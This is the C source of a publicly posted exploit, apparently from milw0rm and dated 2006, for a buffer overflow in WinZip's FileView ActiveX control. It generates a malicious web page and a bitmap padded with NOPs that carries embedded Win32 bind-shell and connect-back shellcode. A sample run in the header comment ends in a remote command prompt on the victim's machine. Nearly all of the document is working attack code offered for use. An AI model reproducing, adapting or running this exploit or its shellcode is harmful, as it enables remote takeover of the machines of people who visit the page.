<html><head><title>WinZIP <= 10.0.7245 (FileView ActiveX) Remote Buffer Overflow Exploit</title></head><pre>/* WinZip &lt;= 10.0.7245 FileView ActiveX buffer overflow exploit
 * ============================================================
 * A vulnerability has been identified within Winzip that allows remote
 * attackers to execute arbitrary code. User interaction is required to 
 * exploit this vulnerability in that the target must visit a malicious 
 * web page. The flaw exists within &quot;FileView&quot; ActiveX control which 
 * contains stack based overflow conditions. This exploit generates a 
 * malicious html page and contains shellcode embedded within an image
 * file. Due to the random nature of the heap, this exploit uses hard
 * coded location of the image bytes within the heap and as such is
 * unreliable in exploitation of this bug, but has approximately 1 in
 * 6 hit ratio within the tested environment. 
 *
 * Example.
 * $ ./prdelka-vs-MS-winzip -f index.html -i foo.bmp -s 0 -t 0
 * [ WinZip &lt;= 10.0.7245 FileView ActiveX overflow exploit
 * [ Using shellcode 'Win32 x86 bind() shellcode (4444/tcp default)' (400 bytes)
 * [ Using target 'WinXP SP2(en) WinZIP 10.0.6667'
 * [ Creating image containing shellcode 'foo.bmp'
 * [ Creating html exploit page 'index.html'
 * $
 * ... clicky clicky MSIE ...
 * $ telnet 192.168.1.223 4444
 * Connected to 192.168.1.223.
 * Escape character is '^]'.
 * 
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 * 
 * C:\Documents and Settings\User\Desktop&gt;
 *
 * - prdelka
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;getopt.h&gt;

#define NOPSIZE 999999

struct target {
        char* name;
        int retaddr;
};

struct shellcode {
        char* name;
        short port;
        int host;
        char* shellcode;
};

int targetno = 1;

struct target targets[] = {
        {&quot;WinXP SP2(en) WinZIP 10.0.6667&quot;,0x02DA3269}
	/* IE 6.0.2900.2180.xp_sp2_gdr.050301-1519 WZ 10.0(6667)&quot; */
};

int shellno = 2;

struct shellcode shellcodes[] = {
        {&quot;Win32 x86 bind() shellcode (4444/tcp default)&quot;,162,-1,
        &quot;\x48\x40\xf5\x49\xd6\x4a\xf9\x91\x47\x96\x2f\xf8\x9b\x37\x41\xf5&quot;
        &quot;\x99\x47\xf9\xf9\xfc\xf9\x48\x4e\x4b\x9b\x90\x9b\xf5\x97\x40\xf9&quot;
        &quot;\xd6\x41\xf9\x48\x9b\x92\xfd\x9b\x49\x42\x4f\x9f\x90\xd6\x27\x9b&quot;
        &quot;\x93\x46\x2f\x90\xfd\x4a\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b&quot;
        &quot;\x81\x73\x13\xbc\xe8\x2b\x27\x83\xeb\xfc\xe2\xf4\x3d\x2c\x7f\xd5&quot;
        &quot;\x43\x17\xd7\x4d\x57\xa5\xc3\xde\x43\x17\xd4\x47\x37\x84\x0f\x03&quot;
        &quot;\x37\xad\x17\xac\xc0\xed\x53\x26\x53\x63\x64\x3f\x37\xb7\x0b\x26&quot;
        &quot;\x57\xa1\xa0\x13\x37\xe9\xc5\x16\x7c\x71\x87\xa3\x7c\x9c\x2c\xe6&quot;
        &quot;\x76\xe5\x2a\xe5\x57\x1c\x10\x73\x98\xc0\x5e\xc2\x37\xb7\x0f\x26&quot;
        &quot;\x57\x8e\xa0\x2b\xf7\x63\x74\x3b\xbd\x03\x28\x0b\x37\x61\x47\x03&quot;
        &quot;\xa0\x89\xe8\x16\x67\x8c\xa0\x64\x8c\x63\x6b\x2b\x37\x98\x37\x8a&quot;
        &quot;\x37\xa8\x23\x79\xd4\x66\x65\x29\x50\xb8\xd4\xf1\xda\xbb\x4d\x4f&quot;
        &quot;\x8f\xda\x43\x50\xcf\xda\x74\x73\x43\x38\x43\xec\x51\x14\x10\x77&quot;
        &quot;\x43\x3e\x74\xae\x59\x8e\xaa\xca\xb4\xea\x7e\x4d\xbe\x17\xfb\x4f&quot;
        &quot;\x65\xe1\xde\x8a\xeb\x17\xfd\x74\xef\xbb\x78\x74\xff\xbb\x68\x74&quot;
        &quot;\x43\x38\x4d\x4f\xad\xb4\x4d\x74\x35\x09\xbe\x4f\x18\xf2\x5b\xe0&quot;
        &quot;\xeb\x17\xfd\x4d\xac\xb9\x7e\xd8\x6c\x80\x8f\x8a\x92\x01\x7c\xd8&quot;
        &quot;\x6a\xbb\x7e\xd8\x6c\x80\xce\x6e\x3a\xa1\x7c\xd8\x6a\xb8\x7f\x73&quot;
        &quot;\xe9\x17\xfb\xb4\xd4\x0f\x52\xe1\xc5\xbf\xd4\xf1\xe9\x17\xfb\x41&quot;
        &quot;\xd6\x8c\x4d\x4f\xdf\x85\xa2\xc2\xd6\xb8\x72\x0e\x70\x61\xcc\x4d&quot;
        &quot;\xf8\x61\xc9\x16\x7c\x1b\x81\xd9\xfe\xc5\xd5\x65\x90\x7b\xa6\x5d&quot;
        &quot;\x84\x43\x80\x8c\xd4\x9a\xd5\x94\xaa\x17\x5e\x63\x43\x3e\x70\x70&quot;
        &quot;\xee\xb9\x7a\x76\xd6\xe9\x7a\x76\xe9\xb9\xd4\xf7\xd4\x45\xf2\x22&quot;
        &quot;\x72\xbb\xd4\xf1\xd6\x17\xd4\x10\x43\x38\xa0\x70\x40\x6b\xef\x43&quot;
        &quot;\x43\x3e\x79\xd8\x6c\x80\x55\xff\x5e\x9b\x78\xd8\x6a\x17\xfb\x27&quot;},
        {&quot;Win32 x86 connect() shellcode (4444/tcp default)&quot;,167,160,
        &quot;\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45&quot;
        &quot;\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49&quot;
        &quot;\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d&quot;
        &quot;\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66&quot;
        &quot;\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61&quot;
        &quot;\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40&quot;
        &quot;\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32&quot;
        &quot;\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6&quot;
        &quot;\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09&quot;
        &quot;\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68&quot;
        &quot;\x01\x02\x03\x04\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9&quot;
        &quot;\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68&quot;
        &quot;\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3&quot;
        &quot;\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab&quot;
        &quot;\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51&quot;
        &quot;\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6&quot;
        &quot;\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6&quot;
        &quot;\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0&quot;}
};

char html1[]=&quot;&lt;HTML&gt;\r\n&lt;HEAD&gt;\r\n&lt;TITLE&gt;&lt;/TITLE&gt;\r\n&lt;/HEAD&gt;\r\n&quot;
	     &quot;&lt;BODY&gt;\r\n&lt;SCRIPT LANGUAGE=\&quot;VBScript\&quot;&gt;\r\nSub WZ&quot;
	     &quot;FILEVIEW_OnAfterItemAdd(Item)\r\nWZFILEVIEW.FilePa&quot;
	     &quot;ttern = \&quot;&quot;; /* smash the stack here */ 

char html2[]=&quot;\&quot;\r\nend sub\r\n&lt;/SCRIPT&gt;\r\n&lt;IMG SRC=\&quot;&quot;;

char html3[]=&quot;\&quot;&gt;\r\n&lt;OBJECT ID=\&quot;WZFILEV&quot;
	     &quot;IEW\&quot; WIDTH=200 HEIGHT=200\r\nCLASSID=\&quot;CLSID:A09A&quot;
	     &quot;E68F-B14D-43ED-B713-BA413F034904\&quot;&gt;\r\n&lt;/OBJECT&gt;\r&quot;
	     &quot;\n&lt;/BODY&gt;\r\n&lt;/HTML&gt;\r\n&quot;;


char bmphdr[]=&quot;\x42\x4d\x3e\xbb\x2d\x00\x00\x00\x00\x00\x36\x00\x00&quot;
	      &quot;\x00\x28\x00\x00\x00\xe7\x03\x00\x00\xe7\x03\x00\x00&quot;
	      &quot;\x01\x00\x18\x00\x00\x00\x00\x00\x08\xbb\x2d\x00\x00&quot;
	      &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
	      &quot;\x00\x00&quot;;
int ret;

void help(char* progname){
	int count;
	printf(&quot;[ Usage instructions.\n[\n&quot;);
	printf(&quot;[ %s &lt;required&gt; (optional)\n[\n[   --filename|-f &lt;file.html&gt;\n&quot;,progname);
	printf(&quot;[   --imgname|-i &lt;image.bmp&gt;\n[   --shellcode|-s &lt;shell#&gt;\n&quot;);
	printf(&quot;[   --shellport|-p (port)\n&quot;);
	printf(&quot;[   --shellhost|-i (ip)\n&quot;);
	printf(&quot;[   --target|-t &lt;target#/0xretaddr&gt;\n[\n&quot;);
	printf(&quot;[ Target#'s\n&quot;);
	for(count = 0;count &lt;= targetno - 1;count++){
        	printf(&quot;[ %d %s 0x%x\n&quot;,count,targets[count],targets[count]);
	}
	printf(&quot;[\n[ Shellcode#'s\n&quot;);
	for(count = 0;count &lt;= shellno - 1;count++){
        	printf(&quot;[ %d \&quot;%s\&quot; (length %d bytes)\n&quot;,count,shellcodes[count].name,strlen(shellcodes[count].shellcode));
	}
	exit(0);
}

void setret(char* retarg){
	int value = atoi(retarg);
	switch(value){
		case 0:
			printf(&quot;[ Using target '%s'\n&quot;,targets[ret].name);
			ret = targets[ret].retaddr;
			break;
		default:
			ret = strtoul(retarg,NULL,16);
			printf(&quot;[ Using return address '0x%x'\n&quot;,ret);
			break;
	}
}

int main(int argc, char* argv[]){
	unsigned long i, fd;
	int c, index, payg, paya, lhost;
	short shellport, shellport2;
	int ishell = 0, itarg = 0;
	char *buffer, *file, *img, *payload;
        static struct option options[] = {
                {&quot;filename&quot;, 1, 0, 'f'},
                {&quot;imgname&quot;, 1, 0, 'i'},
                {&quot;target&quot;, 1, 0, 't'},
                {&quot;shellcode&quot;, 1, 0, 's'},
                {&quot;shellport&quot;, 1, 0, 'p'},
                {&quot;shellhost&quot;, 1, 0, 'd'},
                {&quot;help&quot;, 0, 0,'h'}
        };
	printf(&quot;[ WinZip &lt;= 10.0.7245 FileView ActiveX overflow exploit\n&quot;);
        while(c != -1){
		c = getopt_long(argc,argv,&quot;f:i:t:s:p:d:h&quot;,options,&amp;index);
		switch(c){
			case 'f':
				file = optarg;
				break;
			case 'i':
				img = optarg;
				break;
			case 't':
				itarg = 1;
				setret(optarg);
				if(strlen((char*)&amp;ret) &lt; 4){
					fprintf(stderr,&quot;[ Selected target contains a null address!\n&quot;);	
					exit(-1);
				}
				break;
			case 's':
                                if(ishell==0){
                                payg = atoi(optarg);
				switch(payg){
                                case 0:
                               		printf(&quot;[ Using shellcode '%s' (%d bytes)\n&quot;,shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
                                        payload = malloc(strlen(shellcodes[payg].shellcode)+1);
                                        memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
                                        memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
                                        shellport2 = 4444;
                                        ishell = 1;
                                        break;
                                case 1:
                                	printf(&quot;[ Using shellcode '%s' (%d bytes)\n&quot;,shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
                                	payload = malloc(strlen(shellcodes[payg].shellcode)+1);
                                	memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
                                	memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
                                	shellport2 = 4444;
                                	ishell = 1;
                                	break;
                                default:
                                        printf(&quot;[ Invalid shellcode selection %d\n&quot;,payg);
                                        exit(0);
                                        break;
				}
				}
				break;
			case 'p':
                                if(ishell==1){
                                        if(shellcodes[payg].port &gt; -1){
                                                paya = strlen(payload);
                                                shellport = atoi(optarg);
                                                shellport2 = shellport;
                                                shellport =(shellport&amp;0xff)&lt;&lt;8 | shellport&gt;&gt;8;
                                                memcpy((void*)&amp;payload[shellcodes[payg].port],&amp;shellport,sizeof(shellport));
                                                if(paya &gt; strlen(payload)) {
                                                        printf(&quot;[ Error shellcode port introduces null bytes\n&quot;);
                                                        exit(1);
                                                }
						printf(&quot;[ Shellcode port changed to '%u'\n&quot;,atoi(optarg));
                                        }
                                        else{
                                                printf(&quot;[ (%s) port selection is ignored for current shellcode\n&quot;,optarg);
                                        }
                                }
                                else{
                                        printf(&quot;[ No shellcode selected yet, ignoring (%s) port selection\n&quot;,optarg);
                                }
				break;
			case 'd':
			        if(ishell==1){
                                	if(shellcodes[payg].host &gt; -1){
                              			paya = strlen(payload);
                                		lhost = inet_addr(optarg);
                                		memcpy((void*)&amp;payload[shellcodes[payg].host],&amp;lhost,sizeof(lhost));
                                		if(paya &gt; strlen(payload)){
                                			printf(&quot;[ Error shellhost introduces null bytes\n&quot;);
                                			exit(1);
                                		}
						printf(&quot;[ Shellhost has been changed to '%s'\n&quot;,optarg);
                                	}
                                	else{
                                		printf(&quot;[ (%s) shellhost selection is ignored for current shellcode\n&quot;,optarg);
                                	}
                               	}
                                else {
                                	printf(&quot;[ No shellcode selected yet, ignoring (%s) shellhost selection\n&quot;,optarg);
                                }
				break;
			case 'h':
				help(argv[0]);
				break;
			default:
				break;
		}
	}
	if(ishell==0||itarg==0||strlen(file)==0||strlen(img)==0){
		printf(&quot;[ Error insufficient arguements, try running '%s --help'\n&quot;,argv[0]);
		exit(0);
	}

// create image
	printf(&quot;[ Creating image containing shellcode '%s'\n&quot;,img);
	fd = open(img,O_RDWR|O_CREAT,S_IRWXU);
	if(fd == -1){
		fprintf(stderr,&quot;[ Error creating %s\n&quot;,file);
		exit(-1);
	}
	write(fd,bmphdr,sizeof(bmphdr));
	for(i = 0;i &lt; NOPSIZE;i++){
		write(fd,&quot;\x90&quot;,1);
	}
	write(fd,payload,strlen(payload));
	close(fd);

// create html
	printf(&quot;[ Creating html exploit page '%s'\n&quot;,file);
	fd = open(file,O_RDWR|O_CREAT,S_IRWXU);
        if(fd == -1){
		fprintf(stderr,&quot;[ Error creating %s\n&quot;,file);
                exit(-1);
        }
	write(fd,html1,strlen(html1));
	for(i = 0;i &lt; 265;i++){
		write(fd,&quot;A&quot;,1);
	}
	write(fd,&amp;ret,4);
	for(i = 0;i &lt; 1827;i++){
		write(fd,&quot;A&quot;,1);
	}
	write(fd,html2,strlen(html2));
	write(fd,img,strlen(img));
	write(fd,html3,strlen(html3));
        close(fd);
}

// milw0rm.com [2006-11-15]</pre></html>